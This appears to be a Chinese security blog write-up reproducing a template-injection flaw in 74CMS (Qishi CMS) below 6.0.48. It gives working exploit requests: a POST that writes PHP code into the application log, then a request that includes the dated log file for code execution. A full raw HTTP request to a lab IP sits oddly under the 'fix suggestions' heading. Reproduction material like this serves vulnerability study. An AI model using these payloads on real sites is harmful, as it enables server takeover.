> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Jwi21tojlEj-2NF0nydaGQ)

**一、骑士 CMS 简介**

骑士人才系统, 是一项基于 PHP+MYSQL 为核心开发的一套 免费 + 开源 专业人才招聘系统，使用了 ThinkPHP 框架（3.2.3）；由太原迅易科技有限公司于 2009 年正式推出。为个人求职和企业招聘提供信息化解决方案, 骑士人才系统具备执行效率高、模板切换自由、后台管理功能灵活、模块功能强大等特点，自上线以来一直是职场人士、企业 HR 青睐的求职招聘平台。经过 7 年的发展，骑士人才系统已成国内人才系统行业的排头兵。系统应用涉及政府、企业、科研教育和媒体等行业领域，用户已覆盖国内所有省份和地区。2016 年全新推出骑士人才系统基础版，全新的 “平台 + 插件” 体系，打造用户 “DIY” 个性化功能定制，为众多地方门户、行业人才提供一个专业、稳定、方便的网络招聘管理平台，致力发展成为引领市场风向的优质高效的招聘软件

**二、环境搭建**


==============

此次采用 windows10+Nginx+MySQL+PHP，使用 phpstudy 进行的环境配置，注意 PHP 版本最好使用 PHP 5.5 及以上，MySQL 版本 5.7.6 及以上，我这里使用 PHP 版本 5.4.45

然后这里放一下骑士 cms 的下载链接:https://pan.hallolck.com/s/y06I6

**三、安装过程**


==============

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicoAP7KAOdlQKQH7icgPrVvd95pknLRgAEfDicbplLJ9Cia19PODjjRVWdA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicgGqHicRiaBheHxicetKshNUddiablLYruE76ytRUWA5Bu3zrrMcXdzib8Bw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGic74ywjKznASBpH22nUDVuCjcE4fS1ibIGIibZhmmtaxKbND4LNejy5S1A/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicqribu12sm7df7BDmHf8GFMX3cho0l98IUSXjmicUdrGhljniblVykEstw/640?wx_fmt=png)

**四、漏洞概述**


==============

官方公告地址


----------

```
http://www.74cms.com/news/show-2497.html
```

/Application/Common/Controller/BaseController.class.php 文件的 assign_resume_tpl 函数因为过滤不严格，导致了模板注入，可以进行远程命令执行

**影响版本: 骑士 CMS < 6.0.48>**


------------------------------

**五、漏洞复现**


==============

**写入日志**

POST 参数：

```
http://your-ip/index.php?m=home&a=assign_resume_tpl
POST:
variable=1&tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
```

我们来 POST 一下看看

 可以看到返回了错误，日志已经记录了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicrxOfnV3cBe7QicQ22G0T0nATsXkI39odfFWhH7uCmI82M69G7UVftEg/640?wx_fmt=png)

我们来翻一下日志

成功写入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGictBfqpTfB2Jhf8gJPdaibpOlov0IJia88jZNnNpVouNOOb1V774LE5qpQ/640?wx_fmt=png)

接下来我们尝试包含日志，日志名称就是测试当天的年月日

**包含日志**


------------

POST 参数：

```
日志路径: \upload\data\Runtime\Logs\Home
```

我们来 POST 一下看看

```
http://your-ip/index.php?m=home&a=assign_resume_tpl 
POST: 
variable=1&tpl=data/Runtime/Logs/Home/20_12_22.log
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicJ9QLXAHXnNHreCAXcuSDEz3q0wL7AmpjDAwrHFRib2zM9tibtHkNZkfQ/640?wx_fmt=png)

**六、修复建议**  



=================

下载官方最新补丁包

```
POST /74cmsv6.0.20/upload/index.php?m=home&a=assign_resume_tpl HTTP/1.1
Host: 192.168.1.6
Content-Length: 52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&a=assign_resume_tpl
DNT: 1
Connection: close
Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

variable=1&tpl=./data/Runtime/Logs/Home/21_07_01.log
```